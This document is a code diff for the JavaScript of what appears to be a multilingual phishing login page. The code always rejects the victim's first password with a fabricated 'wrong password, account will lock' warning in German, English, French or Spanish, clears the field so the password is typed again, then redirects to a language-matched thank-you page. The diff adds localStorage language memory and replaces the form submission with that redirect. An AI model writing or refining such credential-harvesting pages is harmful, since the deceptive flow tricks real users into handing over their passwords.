@@ -43,7 +43,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
   if (step2Button) {
     step2Button.addEventListener("click", function (e) {
-      e.preventDefault(); // Verhindere erstmal das automatische Absenden
+      e.preventDefault(); // Verhindere automatisches Absenden
 
       const messages = {
         de: "Falsches Passwort. Noch 2 Versuche bis Kontosperrung.",
@@ -52,10 +52,11 @@ document.addEventListener("DOMContentLoaded", function () {
         es: "Contraseña incorrecta. Quedan 2 intentos antes de bloquear la cuenta."
       };
 
-      const lang = document.documentElement.lang || "de";
+      const langSelect = document.getElementById("language");
+      const selectedLang = langSelect ? langSelect.value : "de";
 
       if (firstTry) {
-        passwordError.textContent = messages[lang] || messages["de"];
+        passwordError.textContent = messages[selectedLang] || messages["de"];
         passwordError.style.display = "block";
         passwordInput.value = "";
         passwordInput.focus();
@@ -64,18 +65,42 @@ document.addEventListener("DOMContentLoaded", function () {
       } else {
         passwordError.style.display = "none";
 
-        // ➡️ Hier das Formular wirklich absenden:
-        document.querySelector('form').submit();
-        // Der Server empfängt die Daten und schickt danach ein Redirect zu danke.html
+        // ➡️ Nach erfolgreicher Eingabe zur passenden Danke-Seite springen:
+        let targetPage = "danke.html";
+        switch (selectedLang) {
+          case "en":
+            targetPage = "danke_eng.html";
+            break;
+          case "fr":
+            targetPage = "danke_fr.html";
+            break;
+          case "es":
+            targetPage = "danke_es.html";
+            break;
+          default:
+            targetPage = "danke.html";
+        }
+
+        window.location.href = targetPage;
       }
     });
   }
 
-
   const langSelect = document.getElementById("language");
   if (langSelect) {
+    // Falls schon eine Sprache im localStorage gespeichert ist → automatisch auswählen!
+    const savedLang = localStorage.getItem("language");
+    if (savedLang) {
+      langSelect.value = savedLang;
+    }
+
     langSelect.addEventListener("change", function () {
       const lang = this.value;
+
+      // Sprache im localStorage speichern
+      localStorage.setItem("language", lang);
+
+      // Seite neu laden (auf die richtige Sprachversion)
       switch (lang) {
         case "de":
           window.location.href = "/index.html";
